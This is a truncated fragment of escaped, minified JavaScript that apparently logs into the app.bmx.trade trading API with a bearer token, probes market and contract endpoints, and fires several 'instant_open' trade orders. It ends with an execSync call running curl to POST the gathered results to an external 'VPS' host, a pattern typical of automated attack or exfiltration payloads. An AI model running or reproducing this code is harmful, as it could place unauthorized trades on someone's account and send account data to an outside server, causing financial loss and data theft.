,{referer:\"https://app.bmx.trade/\",origin:\"https://app.bmx.trade\"});const token=JSON.parse(lr).access_token;r.jwt=token?\"OK\":\"FAIL\";const ah={authorization:\"Bearer \"+token,referer:\"https://app.bmx.trade/\",origin:\"https://app.bmx.trade\"};const lp=await go(BASE+\"/get_locked_params/BTCUSDT?leverage=10\",ah);r.btc_locked=lp.substring(0,300);let lpData;try{lpData=JSON.parse(lp)}catch(e){lpData=null}const mi=await go(BASE+\"/get_market_info\",ah);const mid=JSON.parse(mi);const btcPrice=mid.BTCUSDT?mid.BTCUSDT.price:64000;r.btc_price=btcPrice;const symRaw=await go(BASE+\"/contract-symbols\",ah);const symData=JSON.parse(symRaw);let btcSym=null;for(const s of symData.symbols||[]){if(s.name===\"BTCUSDT\"){btcSym=s;break}}r.btc_sym=btcSym?JSON.stringify({id:btcSym.symbol_id,lot:btcSym.lot_size,minNot:btcSym.min_notional_value}):\"NOT_FOUND\";const symId=btcSym?btcSym.symbol_id:819;const minQty=btcSym?parseFloat(btcSym.lot_size):0.001;const cvaVal=lpData&&lpData.cva?lpData.cva:\"5\";const lfVal=lpData&&lpData.lf?lpData.lf:\"5\";const mmVal=lpData&&lpData.partyAmm?lpData.partyAmm:\"5\";const bmmVal=lpData&&lpData.partyBmm?lpData.partyBmm:\"5\";const tradeBody={symbolId:symId,positionType:0,orderType:0,price:String(Math.round(btcPrice*1.01)),quantity:String(minQty),cva:String(cvaVal),lf:String(lfVal),partyAmm:String(mmVal),partyBmm:String(bmmVal),maxFundingRate:200,deadline:Math.floor(Date.now()/1000)+3600};r.trade_body=JSON.stringify(tradeBody);const tr1=await post(BASE+\"/instant_open\",tradeBody,ah);r.instant_open_1=tr1.substring(0,500);const tradeBody2={...tradeBody,symbolId:819,price:\"3.5\",quantity:\"10\"};const tr2=await post(BASE+\"/instant_open\",tradeBody2,ah);r.instant_open_snx=tr2.substring(0,500);const tradeBody3={...tradeBody,symbolId:2001,price:\"8\",quantity:\"1\"};const tr3=await post(BASE+\"/instant_open\",tradeBody3,ah);r.instant_open_dot=tr3.substring(0,500)}catch(e){r.error=e.message.substring(0,300)}cp.execSync(\"curl -s -X POST \"+VPS+\"/v63